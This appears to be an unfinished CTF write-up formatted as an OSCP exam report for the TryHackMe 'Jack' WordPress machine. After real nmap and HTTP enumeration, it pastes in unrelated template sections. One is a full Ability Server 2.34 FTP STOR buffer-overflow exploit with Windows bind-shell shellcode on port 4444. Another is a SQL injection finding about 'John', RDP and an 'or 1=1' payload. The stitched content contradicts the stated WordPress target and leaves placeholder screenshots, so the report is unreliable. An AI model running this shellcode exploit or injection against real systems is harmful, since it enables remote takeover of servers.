---
title: "Jack WP - Professional Exam Report (OSCP Style)"
author: ["ericgon28@proton.me", "OSID: XXXX"]
date: "2025-04-14"
subject: "Markdown"
keywords: [OSCP, Wordpress]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: 
  - TryHackMe
tags:
  - Difícil
  - CTF
  - Wordpress
image: "https://github.com/user-attachments/assets/a5356a21-0b2a-42d3-89ee-3e0d540acd32"
---
# Jack WP - Professional Exam Report (OSCP Style)

## Introduction

This machine is a great way to learn about the different ways to enumerate and exploit WordPress.
To gain access, we must enumerate the server with WPScan; however, we will only get enough information to fully compromise it by performing an additional enumeration with Nmap scripts.
Finally, before we begin, we add "jack.thm" to the hosts file (/etc/hosts) as needed for name resolution.

## Objective

The goal of the machine is for us to have access and subsequently escalate privileges to have full control.

## Requirements

We have to have the following requirements:

- Nmap
- WPScan

**Exam Network**

10.10.97.82

# Independent Challenges

## Target #1 - 10.10.97.82

### Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.97.82       | **TCP**: 22,80

**Nmap Scan Results:**

The Nmap scan reveals that Port 22 and Port 80 is open and running OpenSSH 7.2p2 and Apache 2.4.18 respectively.

![{DE40A305-E741-4BB4-80B0-053008D4FAC3}](https://github.com/user-attachments/assets/33425e15-b076-4c3e-8ab8-f72f58ffeb9a)


**SSH Enumeration**

From experience, we know that SSH is rarely vulnerable, and especially in this version, we searched for vulnerabilities with "searchsploit" and found a Python script that allows us to list existing users.
We'll leave it at that for now, as we don't have a list of possible valid users.

![{D2BF5A41-E380-4967-8F99-EBC9A5EE59B1}](https://github.com/user-attachments/assets/4c1f1cdd-c793-4661-b902-29437000055a)

**HTTP Enumeration**

We add the jack.thm domain referencing the machine's IP (10.10.97.82) in /etc/hosts.

![{462A6FF3-E1E5-464D-B4C3-CF0E06576281}](https://github.com/user-attachments/assets/9d462718-6131-43f3-9425-a7dc3b9d1976)

The server is running Jack’s personal blog.

![{5CD26E73-DFDF-4301-9FB7-B3F995F98876}](https://github.com/user-attachments/assets/1232d4d8-9053-4936-9596-9c1d9dbf4df8)


### Initial Access - Buffer Overflow

**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field.
Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.

**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue.
It can be found here: http://www.code-crafters.com/abilityserver/

**Severity:** Critical

**Steps to reproduce the attack:** The operating system was different from the known public exploit.
A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Proof of Concept Code Here:** Modifications to the existing exploit was needed and is highlighted in red.

```python
###################################
# Ability Server 2.34 FTP STOR Buffer Overflow
# Advanced, secure and easy to use FTP Server.
# 21 Oct 2004 - muts
###################################
# D:\BO>ability-2.34-ftp-stor.py
###################################
# D:\data\tools>nc -v 127.0.0.1 4444
# localhost [127.0.0.1] 4444 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# D:\Program Files\abilitywebserver>
###################################

import ftplib
from ftplib import FTP
import struct
print "\n\n################################"
print "\nAbility Server 2.34 FTP STOR buffer Overflow"
print "\nFor Educational Purposes Only!\n"
print "###################################"

# Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"

sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
# Change RET address if need be.
buffer = '\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\x42'*32+sc # RET Windows 2000 Server SP4
#buffer = '\x41'*970+struct.pack('<L', 0x7D17D737)+'\x42'*32+sc # RET Windows XP SP2
try:
# Edit the IP, Username and Password.
ftp = FTP('127.0.0.1')
ftp.login('ftp','ftp')
print "\nEvil Buffer sent..."
print "\nTry connecting with netcat to port 4444 on the remote machine."
except:
print "\nCould not Connect to FTP Server."
try:
ftp.transfercmd("STOR " + buffer)
except:
print "\nDone."
```

**Proof Screenshot:**

IMATGE

\newpage

### Privilege Escalation - MySQL Injection

**Vulnerability Explanation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks.
Using Chisel for port forwarding, John was able to access the web application.
When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter.
While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP.
This allowed for a successful breach of the operating system as well as all data contained on the system.

**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue.
The application will need to be programmed to properly sanitize user-input data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted.
Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.

**Severity:** Critical

**Steps to reproduce the attack:**

**Proof of Concept Code Here:**

```sql
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
```

### Post-Exploitation

**System Proof Screenshot:**

IMATGE
